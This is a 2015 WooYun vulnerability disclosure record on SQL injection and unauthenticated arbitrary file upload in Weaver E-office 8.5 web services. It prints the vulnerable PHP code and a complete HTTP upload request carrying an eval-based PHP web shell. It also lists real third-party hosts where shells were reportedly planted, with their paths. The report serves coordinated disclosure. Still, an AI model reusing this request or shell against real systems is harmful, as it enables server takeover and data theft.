{"id": 65656, "wybug_id": "wooyun-2015-0125282", "wybug_title": "泛微E-office 3处sql注射(ROOT SHELL)/2处任意文件上传", "wybug_corp": "泛微E-office", "wybug_author": "menmen519", "wybug_date": "2015-07-10 10:31", "wybug_open_date": "2015-10-08 11:52", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向公众公开  简要描述： 泛微E-office 3处sql注射(ROOT SHELL)/2处任意文件上传，不是为了刷漏洞，临睡前顺带又看了看其他目录，发现还有余孽，一并提交 详细说明：  看了wooyun个大牛发的这个产品的漏洞，感觉版本都过低，这里我发一个8.5的版本，里面新增了webservice的相关操作 下来看代码 经过一阵子的翻阅，发现和webservice 并行的目录也存在越权行为，代码结构类似：\n\n第一个目录webservice-json/login/login.wsdl.php:\nfunction UserLogin( $UserName, $Password ){\t\t\t\t$loginStatus = array( );\t\t\t\tif ( trim( $UserName ) == \"\" )\t\t\t\t{\t\t\t\t\t\t\t\t$loginStatus['status'] = \"false\";\t\t\t\t\t\t\t\t$loginStatus['infor'] = \"用户名为空\";\t\t\t\t\t\t\t\treturn $loginStatus;\t\t\t\t}\t\t\t\t$user = new user( );\t\t\t\tif ( $user->CheckUserAccount( $UserName ) == false )\t\t\t\t{\t\t\t\t\t\t\t\t$loginStatus['status'] = \"false\";\t\t\t\t\t\t\t\t$loginStatus['infor'] = \"用户名不存在\";\t\t\t\t\t\t\t\treturn $loginStatus;\t\t\t\t}\t\t\t\t$userID = $user->getUserIDByUserAccount( $UserName );\t\t\t\tif ( $user->checkOldPassword( $userID, $Password ) == false )\t\t\t\t{\t\t\t\t\t\t\t\t$loginStatus['status'] = \"false\";\t\t\t\t\t\t\t\t$loginStatus['infor'] = \"密码错误\";\t\t\t\t\t\t\t\treturn $loginStatus;\t\t\t\t}\t\t\t\tglobal $connection;\t\t\t\t$query = \"SELECT * from USER where USER_ACCOUNTS='{$UserName}'\";\t\t\t\t$cursor = exequery( $connection, $query );\t\t\t\t$ROW = mysql_fetch_array( $cursor );\t\t\t\t$timenow = time( );\t\t\t\t$CUR_TIME = date( \"Y-m-d H:i:s\", $timenow );\t\t\t\t$query = \"update USER set LAST_VISIT_TIME='{$CUR_TIME}' where USER_ID='\".$ROW['USER_ID'].\"'\";\t\t\t\texequery( $connection, $query );\t\t\t\tsession_start( );\t\t\t\t$_SESSION['LOGIN_USER_ID'] = $ROW['USER_ID'];\t\t\t\t$_SESSION['LOGIN_PASSWORD'] = $ROW['PASSWORD'];\t\t\t\t$_SESSION['LOGIN_POST_PRIV'] = $ROW['POST_PRIV'];\t\t\t\t$_SESSION['LOGIN_USER_ACCOUNTS'] = $ROW['USER_ACCOUNTS'];\t\t\t\t$_SESSION['LOGIN_USER_NAME'] = $ROW['USER_NAME'];\t\t\t\t$_SESSION['LOGIN_USER_PRIV'] = $ROW['USER_PRIV'];\t\t\t\t$_SESSION['LOGIN_DEPT_ID'] = $ROW['DEPT_ID'];\t\t\t\t$loginStatus['status'] = \"true\";\t\t\t\t$loginStatus['infor'] = $ROW['USER_ID'];\t\t\t\t$loginStatus['session_key'] = session_id( );\t\t\t\treturn $loginStatus;}function UserIDLogin( $UserId ){\t\t\t\tglobal $connection;\t\t\t\t$infor = array( );\t\t\t\t$sql = \"SELECT COUNT(*) FROM USER WHERE USER_ID='\".$UserId.\"'\";\t\t\t\t$cursor = exequery( $connection, $sql );\t\t\t\tif ( $ROW = mysql_fetch_array( $cursor ) )\t\t\t\t{\t\t\t\t\t\t\t\t$count = $ROW[0];\t\t\t\t}\t\t\t\tif ( 0 < $count )\t\t\t\t{\t\t\t\t\t\t\t\t$timenow = time( );\t\t\t\t\t\t\t\t$CUR_TIME = date( \"Y-m-d H:i:s\", $timenow );\t\t\t\t\t\t\t\t$query = \"update USER set LAST_VISIT_TIME='{$CUR_TIME}' where USER_ID='\".$UserId.\"'\";\t\t\t\t\t\t\t\texequery( $connection, $query );\t\t\t\t\t\t\t\tsession_start( );\t\t\t\t\t\t\t\t$infor['session_key'] = session_id( );\t\t\t\t\t\t\t\t$infor['status'] = \"true\";\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$infor['status'] = \"false\";\t\t\t\t\t\t\t\t$infor['session_key'] = \"\";\t\t\t\t}\t\t\t\treturn $infor;}function GetCurrentInformation( $UserId ){\t\t\t\tglobal $connection;\t\t\t\t$infor = array( );\t\t\t\tif ( $UserId != \"\" )\t\t\t\t{\t\t\t\t\t\t\t\tglobal $connection;\t\t\t\t\t\t\t\t$user = new user( );\t\t\t\t\t\t\t\t$sql = \"SELECT * FROM USER WHERE USER_ID='\".$UserId.\"'\";\t\t\t\t\t\t\t\t$result = exequery( $connection, $sql );\t\t\t\t\t\t\t\tif ( $row = mysql_fetch_assoc( $result ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$infor = $row;\t\t\t\t\t\t\t\t\t\t\t\t$priv = $row['USER_PRIV']( $row['USER_PRIV'] );\t\t\t\t\t\t\t\t\t\t\t\t$infor['priv_name'] = $priv['PRIV_NAME'];\t\t\t\t\t\t\t\t\t\t\t\t$dept = $row['DEPT_ID']( $row['DEPT_ID'] );\t\t\t\t\t\t\t\t\t\t\t\t$infor['dept_name'] = $dept['DEPT_NAME'];\t\t\t\t\t\t\t\t\t\t\t\t$infor['check'] = \"true\";\t\t\t\t\t\t\t\t\t\t\t\tif ( $row['USER_STATUS'] == \"1\" )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$infor['status'] = \"在职\";\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif ( $row['USER_STATUS'] == \"2\" )\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$infor['status'] = \"离职\";\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$infor['check'] = \"false\";\t\t\t\t}\t\t\t\treturn json_encode( $infor );}include_once( \"nusoap/lib/nusoap.php\" );include_once( \"api/user.class.php\" );include_once( \"inc/conn.php\" );$server = new soap_server( );$server->soap_defencoding = \"UTF-8\";$server->decode_utf8 = false;$server->configureWSDL( \"LoginServicewsdl\", \"urn:LoginServicewsdl\" );$server->wsdl->schemaTargetNamespace = \"urn:LoginServicewsdl\";$server->wsdl->addComplexType( \"loginStatus\", \"complexType\", \"struct\", \"all\", \"\", array( \"status\" => array( \"name\" => \"status\", \"type\" => \"xsd:string\" ), \"infor\" => array( \"name\" => \"infor\", \"type\" => \"xsd:string\" ), \"session_key\" => array( \"name\" => \"session_key\", \"type\" => \"xsd:string\" ) ) );$server->register( \"UserLogin\", array( \"UserName\" => \"xsd:string\", \"Password\" => \"xsd:string\" ), array( \"return\" => \"tns:loginStatus\" ), \"urn:LoginServicewsdl\", \"urn:LoginServicewsdl#UserLogin\", \"rpc\", \"encoded\", \"UserLogin\" );$server->wsdl->addComplexType( \"IDcheck\", \"complexType\", \"struct\", \"all\", \"\", array( \"status\" => array( \"name\" => \"status\", \"type\" => \"xsd:string\" ), \"session_key\" => array( \"name\" => \"session_key\", \"type\" => \"xsd:string\" ) ) );$server->register( \"UserIDLogin\", array( \"UserId\" => \"xsd:string\" ), array( \"return\" => \"tns:IDcheck\" ), \"urn:LoginServicewsdl\", \"urn:LoginServicewsdl#UserIDLogin\", \"rpc\", \"encoded\", \"UserIDLogin\" );$server->register( \"GetCurrentInformation\", array( \"UserId\" => \"xsd:string\" ), array( \"return\" => \"xsd:string\" ), \"urn:LoginServicewsdl\", \"urn:LoginServicewsdl#GetCurrentInformation\", \"rpc\", \"encoded\", \"GetCurrentInformation\" );$server->service( $HTTP_RAW_POST_DATA );?>\n代码结构，风格都一样，漏洞请参照http://www.wooyun.org/bugs/wooyun-2015-0125281/trace/288315217e38c991a819ae7415cd1926webservice-json/upload/upload.php:\ninclude_once( \"inc/utility_all.php\" );$pathInfor = pathinfo( $_FILES['file']['tmp_name'] );$extension = $pathInfor['extension'];$role = UPLOADROLE;$pos = $extension ? strpos( $role, strtoupper( $extension ) ) : false;if ( !( $pos === false ) ){\t\t\t\techo \"false\";}else{\t\t\t\t$attachmentID = createfiledir( );\t\t\t\tglobal $ATTACH_PATH;\t\t\t\t$path = $ATTACH_PATH.$attachmentID;\t\t\t\tif ( !file_exists( $path ) )\t\t\t\t{\t\t\t\t\t\t\t\tmkdir( $path, 448 );\t\t\t\t}\t\t\t\t$attachmentName = $_FILES['file']['tmp_name'];\t\t\t\t$fileName = $path.\"/\".$_FILES['file']['name'];\t\t\t\t$fileName = iconv( \"UTF-8\", \"GBK\", $fileName );\t\t\t\tmove_uploaded_file( $_FILES['file']['tmp_name'], $fileName );\t\t\t\tif ( !file_exists( $fileName ) )\t\t\t\t{\t\t\t\t\t\t\t\techo \"false\";\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\techo $attachmentID.\"*\".$_FILES['file']['name'];\t\t\t\t}}?>\n漏洞参照：http://www.wooyun.org/bugs/wooyun-2015-0125265/trace/efd66a6faa58a6bf64582d7de9f26b1b同理：webservice-xml/login/login.wsdl.phpwebservice-xml/upload/upload.php内容一样 原理同上这里证明一下这些文件在最新的e-office 存在即可http://oa.sccm.cn/webservice-xml/login/login.wsdl.phphttp://oa.vma.cn/webservice-xml/login/login.wsdl.php http://eoffice.sccm.cn/webservice-xml/login/login.wsdl.php http://eoffice8.weaver.cn:8028/webservice-xml/login/login.wsdl.phphttp://oa.sccm.cn/webservice-xml/upload/upload.phphttp://oa.vma.cn/webservice-xml/upload/upload.php http://eoffice.sccm.cn/webservice-xml/upload/upload.php http://eoffice8.weaver.cn:8028/webservice-xml/upload/upload.phphttp://oa.sccm.cn/webservice-json/upload/upload.phphttp://oa.vma.cn/webservice-json/upload/upload.php http://eoffice.sccm.cn/webservice-json/upload/upload.php http://eoffice8.weaver.cn:8028/webservice-json/upload/upload.php看了wooyun个大牛发的这个产品的漏洞，感觉版本都过低，这里我发一个8.5的版本，里面新增了webservice的相关操作 下来看代码 webservice/login/login.wsdl.php?wsdl：\nfunction UserLogin( $UserName, $Password ){\t\t\t\t$loginStatus = array( );\t\t\t\tif ( trim( $UserName ) == \"\" )\t\t\t\t{\t\t\t\t\t\t\t\t$loginStatus['status'] = \"false\";\t\t\t\t\t\t\t\t$loginStatus['infor'] = \"用户名为空\";\t\t\t\t\t\t\t\treturn $loginStatus;\t\t\t\t}\t\t\t\t$user = new user( );\t\t\t\tif ( $user->CheckUserAccount( $UserName ) == false )\t\t\t\t{\t\t\t\t\t\t\t\t$loginStatus['status'] = \"false\";\t\t\t\t\t\t\t\t$loginStatus['infor'] = \"用户名不存在\";\t\t\t\t\t\t\t\treturn $loginStatus;\t\t\t\t}\t\t\t\t$userID = $user->getUserIDByUserAccount( $UserName );\t\t\t\tif ( $user->checkOldPassword( $userID, $Password ) == false )\t\t\t\t{\t\t\t\t\t\t\t\t$loginStatus['status'] = \"false\";\t\t\t\t\t\t\t\t$loginStatus['infor'] = \"密码错误\";\t\t\t\t\t\t\t\treturn $loginStatus;\t\t\t\t}\t\t\t\tglobal $connection;\t\t\t\t$query = \"SELECT * from USER where USER_ACCOUNTS='{$UserName}'\";\t\t\t\t$cursor = exequery( $connection, $query );\t\t\t\t$ROW = mysql_fetch_array( $cursor );\t\t\t\t$timenow = time( );\t\t\t\t$CUR_TIME = date( \"Y-m-d H:i:s\", $timenow );\t\t\t\t$query = \"update USER set LAST_VISIT_TIME='{$CUR_TIME}' where USER_ID='\".$ROW['USER_ID'].\"'\";\t\t\t\texequery( $connection, $query );\t\t\t\tsession_start( );\t\t\t\t$_SESSION['LOGIN_USER_ID'] = $ROW['USER_ID'];\t\t\t\t$_SESSION['LOGIN_PASSWORD'] = $ROW['PASSWORD'];\t\t\t\t$_SESSION['LOGIN_POST_PRIV'] = $ROW['POST_PRIV'];\t\t\t\t$_SESSION['LOGIN_USER_ACCOUNTS'] = $ROW['USER_ACCOUNTS'];\t\t\t\t$_SESSION['LOGIN_USER_NAME'] = $ROW['USER_NAME'];\t\t\t\t$_SESSION['LOGIN_USER_PRIV'] = $ROW['USER_PRIV'];\t\t\t\t$_SESSION['LOGIN_DEPT_ID'] = $ROW['DEPT_ID'];\t\t\t\t$loginStatus['status'] = \"true\";\t\t\t\t$loginStatus['infor'] = $ROW['USER_ID'];\t\t\t\treturn $loginStatus;}include_once( \"nusoap/lib/nusoap.php\" );include_once( \"api/user.class.php\" );include_once( \"inc/conn.php\" );$server = new soap_server( );$server->soap_defencoding = \"UTF-8\";$server->decode_utf8 = false;$server->configureWSDL( \"LoginServicewsdl\", \"urn:LoginServicewsdl\" );$server->wsdl->schemaTargetNamespace = \"urn:LoginServicewsdl\";$server->wsdl->addComplexType( \"loginStatus\", \"complexType\", \"struct\", \"all\", \"\", array( \"status\" => array( \"name\" => \"status\", \"type\" => \"xsd:string\" ), \"infor\" => array( \"name\" => \"infor\", \"type\" => \"xsd:string\" ) ) );$server->register( \"UserLogin\", array( \"UserName\" => \"xsd:string\", \"Password\" => \"xsd:string\" ), array( \"return\" => \"tns:loginStatus\" ), \"urn:LoginServicewsdl\", \"urn:LoginServicewsdl#UserLogin\", \"rpc\", \"encoded\", \"UserLogin\" );$server->service( $HTTP_RAW_POST_DATA );?>\nhttp://eoffice.sccm.cn/webservice/login/login.wsdl.php?wsdl这个文件也没有进行任何auth验证：\n\n我们访问：http://eoffice.sccm.cn/attachment/1.php原理都相同，不多赘述http://oa.sccm.cn//webservice/eoffice.wsdl.php?wsdlhttp://oa.vma.cn/webservice/eoffice.wsdl.php?wsdl http://eoffice.sccm.cn/webservice/eoffice.wsdl.php?wsdl http://eoffice8.weaver.cn:8028/webservice/eoffice.wsdl.php?wsdl任意文件上传：下来看代码：webservice/upload.php\ninclude_once( \"inc/utility_all.php\" );$pathInfor = pathinfo( $_FILES['file']['tmp_name'] );$extension = $pathInfor['extension'];$role = UPLOADROLE;$attachmentID = createfiledir( );global $ATTACH_PATH;$path = $ATTACH_PATH.$attachmentID;if ( !file_exists( $path ) ){\t\t\t\tmkdir( $path, 448 );}$attachmentName = $_FILES['file']['tmp_name'];$fileName = $path.\"/\".$_FILES['file']['name'];$fileName = iconv( \"UTF-8\", \"GBK\", $fileName );move_uploaded_file( $_FILES['file']['tmp_name'], $fileName );if ( !file_exists( $fileName ) ){\t\t\t\techo \"false\";}else{\t\t\t\techo $attachmentID.\"*\".$_FILES['file']['name'];}\n文件上传条件：1.无需登录2.文件的路径为attachment/$attachmentID 这里的$attachmentID 会被回显过来3.无需后缀验证发送如下请求：POST /webservice/upload.php HTTP/1.1Host: eoffice.sccm.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------74141544123431Content-Length: 818-----------------------------74141544123431Content-Disposition: form-data; name=\"file\"; filename=\"1.php\"Content-Type: image/jpeg<?php phpinfo();@eval($_POST['chopper']);?>-----------------------------74141544123431--\n\nshell\n\n案例：http://oa.sccm.cn/http://oa.vma.cn/attachment/2754969047/wooyun.phphttp://eoffice.sccm.cn/attachment/2070630318/wooyun.phpeoffice8.weaver.cn:8028/attachment/1002074664/wooyun.php其中最后一个官网设置了目录访问权限，所以不能访问那个文件但是文件已经上传上去了，这种情况，如果有特殊说明，必须告知用户，否则后果很严重第二处：webservice/upload/upload.php:\ninclude_once( \"inc/utility_all.php\" );$pathInfor = pathinfo( $_FILES['file']['tmp_name'] );$extension = $pathInfor['extension'];$role = UPLOADROLE;$pos = $extension ? strpos( $role, strtoupper( $extension ) ) : false;if ( !( $pos === false ) ){\t\t\t\techo \"false\";}else{\t\t\t\t$attachmentID = createfiledir( );\t\t\t\tglobal $ATTACH_PATH;\t\t\t\t$path = $ATTACH_PATH.$attachmentID;\t\t\t\tif ( !file_exists( $path ) )\t\t\t\t{\t\t\t\t\t\t\t\tmkdir( $path, 448 );\t\t\t\t}\t\t\t\t$attachmentName = $_FILES['file']['tmp_name'];\t\t\t\t$fileName = $path.\"/\".$_FILES['file']['name'];\t\t\t\t$fileName = iconv( \"UTF-8\", \"GBK\", $fileName );\t\t\t\tmove_uploaded_file( $_FILES['file']['tmp_name'], $fileName );\t\t\t\tif ( !file_exists( $fileName ) )\t\t\t\t{\t\t\t\t\t\t\t\techo \"false\";\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\techo $attachmentID.\"*\".$_FILES['file']['name'];\t\t\t\t}}?>\n代码很相似，绕一下逻辑即可，原理就不用解释了   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-07-10 11:50 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商（或网站管理方）公开联系渠道向其邮件（和电话）通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-09 15:42 |    \t\t君宝 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 不要跟我比浪。。你浪不过我。。)\t\t \n  来点赞哒！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}